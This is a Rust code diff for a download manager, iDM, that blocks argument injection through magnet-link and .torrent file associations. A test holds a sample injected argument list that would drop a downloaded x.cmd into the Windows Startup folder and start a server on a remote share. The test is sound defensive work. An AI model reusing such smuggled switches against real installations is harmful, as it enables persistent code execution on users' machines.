@@ -760,6 +760,26 @@ pub fn random_token() -> String {
 /// LaunchAgent, the installer's): iDM starts in the notification area ([`Command::startup`]).
 pub const STARTUP: &str = "/startup";
 
+/// A bare magnet link or a .torrent file's path: what an association passes (`"%1"`, `%U`).
+fn association_target(a: &str) -> bool {
+    a.get(..7)
+        .is_some_and(|s| s.eq_ignore_ascii_case("magnet:"))
+        || a.to_ascii_lowercase().ends_with(".torrent")
+}
+
+/// The arguments (without the program's name) iDM may read, as it was started. Started for a
+/// magnet link or a .torrent file (the first argument is one, as the associations pass it:
+/// Windows' `"iDM.exe" "%1"`, Linux's `%U`), only magnet links and .torrent files are kept: a
+/// `"` in a link that a launcher passes on unescaped ends Windows' quoting of `%1`, and what
+/// follows it in the link would otherwise be read as switches of its own (`/p`, `/f`, `/n`,
+/// `/d`, `--headless`, `--data`…). Any other command line is kept as it is.
+pub fn launch_args(args: Vec<String>) -> Vec<String> {
+    if !args.first().is_some_and(|a| association_target(a)) {
+        return args;
+    }
+    args.into_iter().filter(|a| association_target(a)).collect()
+}
+
 /// Parse IDM's command line: `/d URL [/p dir] [/f name] [/a] [/n] [/q] [/s]` (case-insensitive;
 /// `-d` also accepted). Returns None when there is nothing to do.
 pub fn parse_args(args: &[String]) -> Option<Command> {
@@ -780,11 +800,7 @@ pub fn parse_args(args: &[String]) -> Option<Command> {
             "startup" => cmd.startup = true,
             "show" => cmd.show = it.next().map(|w| w.to_ascii_lowercase()),
             // A bare magnet link or .torrent file (what Windows passes for an association).
-            _ if a
-                .get(..7)
-                .is_some_and(|s| s.eq_ignore_ascii_case("magnet:"))
-                || a.to_ascii_lowercase().ends_with(".torrent") =>
-            {
+            _ if association_target(a) => {
                 cmd.url = Some(a.clone());
             }
             _ => continue,
@@ -824,6 +840,40 @@ mod tests {
         assert!(parse_args(&["stray".into()]).is_none());
         let c = parse_args(&["/show".into(), "Options:Connection".into()]).unwrap();
         assert_eq!(c.show.as_deref(), Some("options:connection"));
+    }
+
+    /// A magnet link with a `"` passed on unescaped to `"iDM.exe" "%1"`: Windows splits it, and
+    /// what follows the quote must not become switches (a file written where the link says, a
+    /// server started on its data folder).
+    #[test]
+    fn an_association_brings_no_switches() {
+        let s = |v: &[&str]| v.iter().map(|a| a.to_string()).collect::<Vec<_>>();
+        let injected = s(&[
+            "magnet:?xt=urn:btih:abc",
+            "/p",
+            r"C:\Users\u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup",
+            "/f",
+            "x.cmd",
+            "/n",
+            "/d",
+            "http://x.test/x.cmd",
+            "--headless",
+            "--data",
+            r"\\x.test\share",
+        ]);
+        let args = launch_args(injected);
+        assert_eq!(args, s(&["magnet:?xt=urn:btih:abc"]));
+        let c = parse_args(&args).unwrap();
+        assert_eq!(c.url.as_deref(), Some("magnet:?xt=urn:btih:abc"));
+        assert!(c.dir.is_none() && c.name.is_none() && !c.silent);
+        // Several files opened together (Linux's %U) stay.
+        let many = s(&[r"/dl/a.torrent", "/dl/b.TORRENT", "magnet:?xt=urn:btih:c"]);
+        assert_eq!(launch_args(many.clone()), many);
+        // IDM's own command line, and the app's switches, are untouched.
+        let own = s(&["/d", "http://x/a.torrent", "/p", r"C:\dl", "/n"]);
+        assert_eq!(launch_args(own.clone()), own);
+        assert_eq!(launch_args(s(&["--headless"])), s(&["--headless"]));
+        assert!(launch_args(Vec::new()).is_empty());
     }
 
     #[test]
